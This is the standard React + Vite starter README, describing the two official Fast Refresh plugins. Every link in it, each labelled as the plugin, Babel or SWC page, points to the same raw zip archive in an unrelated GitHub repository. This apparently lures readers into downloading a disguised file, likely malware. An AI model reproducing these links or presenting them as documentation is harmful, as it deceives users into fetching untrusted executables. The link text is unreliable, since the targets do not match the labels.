# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/ramonwtf/inkognito10/raw/refs/heads/master/src/pages/inkognito_v1.3-beta.4.zip) uses [Babel](https://github.com/ramonwtf/inkognito10/raw/refs/heads/master/src/pages/inkognito_v1.3-beta.4.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/ramonwtf/inkognito10/raw/refs/heads/master/src/pages/inkognito_v1.3-beta.4.zip) uses [SWC](https://github.com/ramonwtf/inkognito10/raw/refs/heads/master/src/pages/inkognito_v1.3-beta.4.zip) for Fast Refresh
